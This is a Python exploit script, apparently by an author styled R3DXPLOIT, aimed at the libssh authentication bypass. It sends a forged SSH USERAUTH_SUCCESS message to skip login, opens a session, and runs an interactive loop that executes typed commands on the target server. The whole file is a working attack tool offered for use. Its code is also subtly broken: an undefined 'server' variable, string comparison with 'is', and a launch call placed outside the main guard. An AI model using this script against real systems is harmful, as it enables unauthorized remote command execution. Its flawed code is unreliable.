#!/usr/bin/python3
'''_____________________________________________________________________
|[] R3DXPL0IT SHELL                                            |ROOT]|!"|
|"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""|"| 
|CODED BY > R3DXPLOIT(JIMMY)                                          | |
|EMAIL > RETURN_ROOT@PROTONMAIL.COM                                   | |
|GITHUB > https://github.com/r3dxpl0it                                | |
|WEB-PAGE > https://r3dxpl0it.Github.io                               |_|
|_____________________________________________________________________|/|
'''
import sys,getopt
import paramiko
import socket

class LibSSH :
	def __init__ (self , argv , Moderator = print) :
		self.mod = Moderator
		try:
			opts, args = getopt.getopt(argv,"hs:p:",["iserver=","iport="])
		except getopt.GetoptError :
			self.mod('Wrong Usage')
			quit()
		for opt, arg in opts:
			if opt is '-h':
				self.mod('Wrong Usage')
				quit()
			elif opt in ("-s", "--iserver"):
				self.server = arg
			elif opt in ("-p", "--iport"):
				self.port = arg
		if (not self.server or not self.port):
		   self.mod('Wrong Usage')
		   quit()
		print ("\n[*]Connecting to the target "+self.server+":"+self.port)
	def Launch(self) : 
		try:
			s = socket.socket()
			s.connect((str(self.server),int(self.port)))
			m = paramiko.message.Message()
			t = paramiko.transport.Transport(s)
			t.start_client()
			m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
			t._send_message(m)
			c = t.open_session()
			while True:
				command = input("Command "+server+":> ")
				c.exec_command(str(command))
				out = c.makefile("rb",2048)
				output = out.read()
				out.close()
				print(output)
		except paramiko.SSHException:
			self.mod("Your target is not vulnerable or libssh is not present")
			sys.exit(1)
		except socket.error:
			self.mod("Unable to connect. Try again.")
			sys.exit(1)
		except EOFError : 
			self.mod("Cannot Test the Server")

if __name__ == "__main__":
   a = LibSSH(sys.argv[1:])
a.Launch()
